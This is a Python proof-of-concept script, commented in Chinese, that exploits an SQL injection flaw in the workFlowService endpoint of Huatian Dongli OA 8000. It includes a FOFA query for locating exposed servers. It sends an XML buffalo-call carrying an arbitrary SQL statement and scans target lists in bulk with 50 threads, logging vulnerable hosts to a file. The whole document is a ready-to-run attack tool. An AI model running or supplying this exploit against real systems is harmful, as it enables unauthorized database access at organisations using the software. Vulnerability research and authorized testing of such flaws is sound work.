# 华天动力OA 8000版 workFlowService SQL注入漏洞
import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


# fofa语句
# app="华天动力-OA8000"

def banner():
    test = """
██╗  ██╗████████╗██████╗ ██╗      ███████╗ ██████╗ ██╗     
██║  ██║╚══██╔══╝██╔══██╗██║      ██╔════╝██╔═══██╗██║     
███████║   ██║   ██║  ██║██║█████╗███████╗██║   ██║██║     
██╔══██║   ██║   ██║  ██║██║╚════╝╚════██║██║▄▄ ██║██║     
██║  ██║   ██║   ██████╔╝███████╗ ███████║╚██████╔╝███████╗
╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝

                                   
"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='华天动力OA 8000版 workFlowService SQL注入漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/OAapp/bfapp/buffalo/workFlowService"
    headers = {
        "Accept-Encoding": "identity",
        "Content-Length": "103",
        "Accept-Language": "zh-CN,zh;q=0.8",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
        "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0"
    }
    data = '''
		<buffalo-call> <method>getDataListForTree</method> 
		<string>select user()</string> 
		</buffalo-call>
'''

    try:
        res = requests.get(url=target, verify=False, timeout=10)
        res1 = requests.post(url=target + api_payload, headers=headers, data=data, verify=False, timeout=10)
        if res.status_code == 200:
            if res1.status_code == 200 and "root" in res1.text:
                print(f"[+]{target} 存在sql注入漏洞")
                with open('result.txt', 'a') as fp:
                    fp.write(target + '\n')
            else:
                print(f"[-]{target} 不存在sql注入漏洞")
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()